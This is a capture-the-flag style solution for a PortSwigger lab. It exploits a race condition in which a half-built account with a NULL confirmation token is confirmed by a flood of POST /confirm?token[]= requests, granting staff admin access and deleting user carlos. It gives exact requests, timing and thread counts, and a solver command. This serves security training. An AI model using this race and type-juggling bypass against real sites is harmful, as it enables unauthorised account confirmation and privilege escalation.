# SOLUTION — Partial construction race conditions (EXPERT)

**Result:** Lab **SOLVED** — verified via the page status widget
(`widgetcontainer-lab-status is-solved`, `<p>Solved</p>`) after `carlos` was
deleted.

## The vulnerability in one paragraph

`POST /register` creates the user row in the database **before** it generates
and stores that user's email-confirmation token. For that short window the row
exists with an uninitialised (`NULL`) token. `POST /confirm` compares the
supplied token against the stored value with PHP's loose comparison, and an
**empty array** satisfies `[] == null`. So any confirmation request that lands
inside the window confirms the half-built account — no email access needed.
Registration only accepts `@ginandjuice.shop` addresses, and that domain is
treated as staff, which is what unlocks the admin panel.

## Reproduction (manual)

1. `GET /register` — take the `csrf` token (the session cookie is bound to it).
2. Confirm the token parsing quirks first (all `POST`, empty body):

   | Request | Response |
   |---|---|
   | `/confirm` | `400 Missing parameter: token` |
   | `/confirm?token=` | `403 Forbidden` |
   | `/confirm?token=bogus` | `400 Incorrect token: bogus` |
   | `/confirm?token[]=` | `400 Incorrect token: Array` ← array is processed |

3. Race one registration against a burst of `POST /confirm?token[]=` requests:

   ```
   POST /register                 csrf=<t>&username=<u>&email=<u>@ginandjuice.shop&password=<p>
   POST /confirm?token[]=         xN, in parallel with the registration
   ```

   In Burp/Turbo Intruder: queue the register plus ~50 confirms per attempt on
   one gate, ~20 attempts. In Python: one thread sends the registration while
   6–8 threads flood `?token[]=`; start the flood ~50 ms *before* the
   registration so requests are already in flight when the window opens.
4. Success signal: a `/confirm?token[]=` response returns **`200`** with the
   normal lab page instead of `400 "Incorrect token: Array"`.
5. Log in with the raced username/password. `302 → /my-account` means the
   account is confirmed (invalid credentials return `200` on `/login`).
6. `/my-account` now shows **Admin panel** (the `@ginandjuice.shop` address).
7. `GET /admin/delete?username=carlos` → `302`; `/admin` no longer lists
   `carlos`; the home page widget flips to `is-solved`.

## Automated

```bash
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
```

or through the universal launcher:

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
```

The solver fetches its own CSRF tokens/sessions, generates a unique username
nonce, races, logs in, deletes `carlos`, and exits `0` only after the solved
widget is observed. Measured on this instance: **13.4 s, 150 requests,
5 of 8 attempts confirmed**.

## Why the obvious "fixes" don't help

- `token=` (empty string) is explicitly rejected with `403` — the empty
  *scalar* is not the bypass; the empty *array* is.
- Sending `?token[]=` when no user is mid-registration returns
  `400 Incorrect token: Array` — the bypass is strictly a timing attack, not a
  type-juggling shortcut on its own.
- Sequential (non-concurrent) requests never win: the window closes when the
  token write commits, so the confirm must be in flight at the same moment.
  Note also that PHP's session handler serialises requests that share a
  session, so send the confirms with **no** session cookie (or their own) —
  never through the session that is registering.
